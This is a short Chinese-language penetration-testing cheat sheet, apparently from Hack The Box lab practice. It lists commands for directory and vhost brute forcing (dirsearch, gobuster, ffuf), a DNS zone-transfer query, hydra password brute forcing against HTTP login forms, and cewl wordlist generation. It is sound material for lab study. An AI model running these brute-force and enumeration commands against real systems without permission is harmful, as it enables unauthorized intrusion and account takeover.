# web 目录爆破

## dirsearch

```
python3 /root/dirsearch/dirsearch.py -e* -u 10.10.10.233 -t 100
```

## gobuster

```
gobuster dir -w /usr/share/wordlists/Web-Content/common.txt -u http://10.10.10.191 -t 30 --no-error
```


## ffuf

```
ffuf -w /path/to/wordlist -u https://target/FUZZ
```


# 爆破带指定扩展名
```
gobuster dir -t 100  --no-error --url http://10.13.38.11 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,txt
```



# vhost爆破
```
gobuster vhost -u horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
```

如果开启了DNS服务，并且存在域传送漏洞
```
dig axfr cronos.htb @10.10.10.13
```


# fuzzing特定url
```
ffuf -w co_fuzz.txt -u http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt
```


# 爆破登录表单

http
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^&login=Login:Incorrect username or password."
```

https
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```


# 根据页面生成用户名/密码名单

```
cewl --with-numbers -w passwd.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm

cewl -d 1 -m 3 -w user.txt 10.10.10.175
```